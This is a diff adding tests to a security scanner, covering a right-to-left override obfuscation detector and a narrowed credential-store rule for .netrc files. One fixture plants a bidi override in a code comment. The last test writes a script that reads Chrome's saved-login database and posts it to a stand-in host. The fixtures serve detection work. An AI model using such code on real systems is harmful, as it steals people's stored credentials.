@@ -10728,3 +10728,149 @@ class TestAPrefixIsHalfOfAFormat:
             f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SECRET.GITHUB.TOKEN.001"
         ]
         assert [f.location.path for f in found] == ["leaked.tf"]
+
+
+class TestAFileThatIsRightToLeftText:
+    """The string being ordered contained no script to order.
+
+    `_orders_rtl_text` asks whether the control sits beside right-to-left script
+    within twenty-four bytes, and that is the right question almost everywhere.
+    It cannot answer the case where the string holds no script at all.
+    Thunderbird's Persian Android resources carry an `RLE` and an `RLM` in front
+    of a string whose entire content is two substituted placeholders -- a
+    filename and a size -- so that what gets substituted renders the right way
+    round in a right-to-left interface. There is no Persian inside the window
+    because there is no Persian in the string. The lines either side of it, and
+    the file, are unmistakably Persian.
+
+    Measured: that file is 25.2% right-to-left by letter, a 1.2MB webpack bundle
+    in `dimagi/commcare-hq` is 0.01%, and this project's own source is 0.00%.
+    """
+
+    PERSIAN = (
+        "<resources>\n"
+        '    <string name="accessibility_move_down">جابه'
+        "‌جایی به پایین</string>\n"
+        '    <string name="notification_actions_settings_description">'
+        "تغییر ترتیب "
+        "کنش‌های آگاهی.</string>\n"
+        '    <string name="attachment_summary">‫‏'
+        '<xliff:g id="name">%1$s</xliff:g> (<xliff:g id="size">%2$s</xliff:g>)</string>\n'
+    )
+    """The shape, with enough Persian around it to be the file it came from."""
+
+    @staticmethod
+    def _is_resource(text: str) -> bool:
+        from cordon_scanner.detect.obfuscation import _is_rtl_resource
+
+        return _is_rtl_resource(text.encode())
+
+    def test_a_persian_resource_is_right_to_left_text(self) -> None:
+        assert self._is_resource(self.PERSIAN * 12)
+
+    def test_code_with_a_stray_override_is_not(self) -> None:
+        """What the predicate must not excuse: an override in source."""
+        assert not self._is_resource(
+            "function check(user) {\n"
+            "    // ‮ if (user.isAdmin) { return true; }\n"
+            "    return false;\n" * 40
+        )
+
+    def test_a_handful_of_arabic_strings_in_code_is_not(self) -> None:
+        """A file with some right-to-left test data in it stays code. The
+        threshold is set below a translation's floor, not above the noise."""
+        source = (
+            "const messages = {\n"
+            '    greeting: "مرحبا",\n'
+            '    farewell: "some fairly long English identifier text here",\n'
+            "};\n"
+        )
+        assert not self._is_resource(source * 30)
+
+    def test_a_short_file_is_judged_as_code(self) -> None:
+        """Below the minimum letter count a share means nothing."""
+        assert not self._is_resource("‫مرحبا")
+
+    def test_thunderbird_drops_below_the_gate_and_a_bundle_does_not(self, tmp_path) -> None:
+        resources = tmp_path / "values-fa"
+        resources.mkdir()
+        (resources / "strings.xml").write_text(self.PERSIAN * 12, encoding="utf-8")
+        (tmp_path / "bundle.js").write_text(
+            "var x=1;// ‮" + "".join(f"function f{n}(){{return {n}}}" for n in range(200)),
+            encoding="utf-8",
+        )
+        found = {
+            f.location.path: f.severity
+            for f in Scanner().scan(tmp_path).findings
+            if f.rule_id == "SUSPECT.OBFUSCATION.BIDI.001"
+        }
+        assert found["values-fa/strings.xml"] is Severity.LOW
+        assert found["bundle.js"] is Severity.HIGH
+
+
+class TestNothingOwnsANetrc:
+    """`.netrc` failed the credential-store rule's own test, more broadly than
+    the kubeconfig that was removed from the same list before it.
+
+    The rule's premise is that the access is unexplainable: these are files
+    "read by the software that owns them and by essentially nothing else". A
+    kubeconfig at least names one kind of service. `.netrc` names none -- it is
+    the generic credential file for arbitrary hosts, and its readers are curl,
+    wget, git, pip, bazelisk and every other tool that authenticates a download
+    without prompting, which is what it exists for.
+
+    Six of the ten credential-store findings sampled in the thirtieth round were
+    this one file name: `mongodb/mongo`'s `bazelisk.py` reads it with
+    `netrc.netrc().hosts.get(parts.netloc)` to download Bazel, its
+    `query_correctness_corpus_fetch.py` documents its own authentication as "a
+    GitHub token from the environment, ~/.netrc, or the gh CLI", and
+    `LeCoupa/awesome-cheatsheets` shows `mv ~/.netrc ~/.netrc.backup` as the way
+    to reset a Heroku login.
+
+    It stays credential material on the same terms as the kubeconfig, so the
+    three-signal and install-hook rules still see it.
+    """
+
+    BAZELISK = (
+        "import netrc\n"
+        "from urllib.request import urlopen\n"
+        "\n"
+        "def download(url, parts):\n"
+        "    creds = netrc.netrc().hosts.get(parts.netloc)\n"
+        "    with urlopen(url) as res:\n"
+        "        return res.read()\n"
+    )
+
+    def test_reading_a_netrc_to_download_is_not_a_credential_store(self, tmp_path) -> None:
+        (tmp_path / "bazelisk.py").write_text(self.BAZELISK, encoding="utf-8")
+        assert "SUSPECT.EXFIL.CREDENTIAL_STORE.001" not in flagged(tmp_path)
+
+    def test_a_netrc_is_still_credential_material(self) -> None:
+        """Removed from the two-signal rule, not from the primitive. This is the
+        half that keeps the three-signal and install-hook rules seeing it."""
+        from cordon_scanner.core.models import Capability
+        from cordon_scanner.rules.loader import RuleLoader
+
+        packs = RuleLoader.load_builtin()
+        naming = [
+            cr.rule.id
+            for pack in packs
+            for cr in pack.rules
+            if cr.match.regex is not None
+            and b"netrc" in cr.match.regex.pattern
+            and getattr(cr.rule, "capability", None) is Capability.CREDENTIAL
+        ]
+        assert naming, "no credential primitive names a .netrc any more"
+
+    def test_a_browser_login_database_still_reports(self, tmp_path) -> None:
+        """What the rule is for, unchanged."""
+        (tmp_path / "collect.py").write_text(
+            "import sqlite3, requests\n"
+            "from pathlib import Path\n"
+            "\n"
+            'store = Path.home() / ".config" / "google-chrome" / "Default" / "Login Data"\n'
+            "rows = sqlite3.connect(store).execute('select * from logins').fetchall()\n"
+            'requests.post("https://drop.invalid/c", json={"rows": str(rows)})\n',
+            encoding="utf-8",
+        )
+        assert "SUSPECT.EXFIL.CREDENTIAL_STORE.001" in flagged(tmp_path)
